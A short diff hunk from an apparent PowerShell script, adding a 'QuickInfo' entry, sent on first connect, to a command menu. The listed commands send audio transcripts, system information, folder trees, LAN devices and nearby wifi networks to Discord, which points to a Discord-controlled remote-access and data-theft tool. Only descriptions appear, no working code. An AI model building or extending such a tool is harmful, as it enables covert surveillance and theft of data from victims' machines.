@@ -35,6 +35,7 @@ $script:jsonPayload = @{
             "description" = @"
 - **SpeechToText**: Send audio transcript to Discord
 - **Systeminfo**: Send System info as text file to Discord
+- **QuickInfo**: Send a quick System info embed (sent on first connect)
 - **FolderTree**: Save folder trees to file and send to Discord
 - **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
 - **NearbyWifi**: Show nearby wifi networks (!user popup!)
